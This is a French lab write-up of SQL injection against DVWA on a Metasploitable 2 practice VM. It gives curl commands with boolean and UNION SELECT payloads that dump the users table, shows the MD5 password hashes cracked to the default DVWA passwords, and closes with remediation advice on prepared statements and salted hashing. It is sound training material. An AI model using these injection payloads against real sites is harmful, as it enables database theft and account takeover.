# Write-up — DVWA, injection SQL (Metasploitable 2, port 80)

Cible : `192.168.56.101` (réseau josa `vboxnet0`) · Kali : `192.168.56.1`.
Résultat : **injection SQL** (UNION) → dump de la table `users` et des **empreintes de mots de
passe** de l'application.

> Réseau : services de josa sur `vboxnet0` (`192.168.56.0/24`). MS2 = `192.168.56.101`.
> Faille distincte de l'injection de commande DVWA (voir `dvwa.md`) : ici c'est la page
> *SQL Injection*.

**C'est quoi ?** La page *SQL Injection* de DVWA insère le paramètre `id` directement dans une
requête SQL (`SELECT first_name, last_name FROM users WHERE user_id = '$id'`) sans
échappement en sécurité **low**. On peut donc modifier la requête : tout retourner, ou
**greffer un `UNION SELECT`** pour extraire d'autres colonnes/tables.

---

## 1. Accès

Connexion DVWA avec `admin:password`, sécurité **low** (voir `dvwa.md` pour la procédure),
page `http://192.168.56.101/dvwa/vulnerabilities/sqli/`.

## 2. Confirmation de l'injection (booléenne)

```bash
curl -s -b dvwa.txt -b "security=low" -G \
  "http://192.168.56.101/dvwa/vulnerabilities/sqli/" \
  --data-urlencode "id=1' OR '1'='1" --data "Submit=Submit"
```
Sortie (nettoyée) :
```
First name: admin    Surname: admin
First name: Gordon   Surname: Brown
First name: Hack     Surname: Me
First name: Pablo    Surname: Picasso
First name: Bob      Surname: Smith
```

Avec `id=1' OR '1'='1`, la condition devient toujours vraie → **tous** les enregistrements
sont renvoyés (et non le seul `id=1`). L'injection est confirmée.

## 3. Exploitation — UNION pour dumper les identifiants

La requête renvoie 2 colonnes (first name / surname). On y greffe un `UNION SELECT` pour en
extraire `user` et `password` de la table `users` :

```bash
curl -s -b dvwa.txt -b "security=low" -G \
  "http://192.168.56.101/dvwa/vulnerabilities/sqli/" \
  --data-urlencode "id=1' UNION SELECT user, password FROM users #" --data "Submit=Submit"
```
Sortie (nettoyée) :
```
First name: admin     Surname: admin
First name: admin     Surname: 5f4dcc3b5aa765d61d8327deb882cf99
First name: gordonb   Surname: e99a18c428cb38d5f260853678922e03
First name: 1337      Surname: 8d3533d75ae2c3966d7e0d4fcc69216b
First name: pablo     Surname: 0d107d09f5bbe40cade3de5c71e9e9b7
First name: smithy    Surname: 5f4dcc3b5aa765d61d8327deb882cf99
```

Le `#` commente la fin de la requête d'origine. La 2ᵉ colonne affiche maintenant le **champ
`password`** : les empreintes **MD5** des comptes DVWA.

## 4. Preuve / exploitation des hash

Les empreintes sont des **MD5 non salés**, cassables instantanément (ce sont des mots de passe
connus de DVWA) :

| user     | hash MD5                           | mot de passe |
|----------|------------------------------------|--------------|
| admin    | `5f4dcc3b5aa765d61d8327deb882cf99` | `password`   |
| gordonb  | `e99a18c428cb38d5f260853678922e03` | `abc123`     |
| 1337     | `8d3533d75ae2c3966d7e0d4fcc69216b` | `charley`    |
| pablo    | `0d107d09f5bbe40cade3de5c71e9e9b7` | `letmein`    |
| smithy   | `5f4dcc3b5aa765d61d8327deb882cf99` | `password`   |

(`admin` → `5f4dcc3b...` est le MD5 littéral de « password » ; vérifiable avec
`echo -n password | md5sum`.) L'injection permet donc **la récupération et le cassage de tous
les comptes applicatifs**.

## 5. Remédiation (résumé)

Requêtes **paramétrées** (requêtes préparées) au lieu de concaténer l'entrée ; échappement /
validation stricte du paramètre `id` (entier attendu). Stocker les mots de passe avec un
algorithme lent et salé (bcrypt/argon2), jamais en MD5 nu.

---

**Pour rejouer :** page *SQL Injection* (sécurité low), champ `id` =
`1' UNION SELECT user, password FROM users #`.
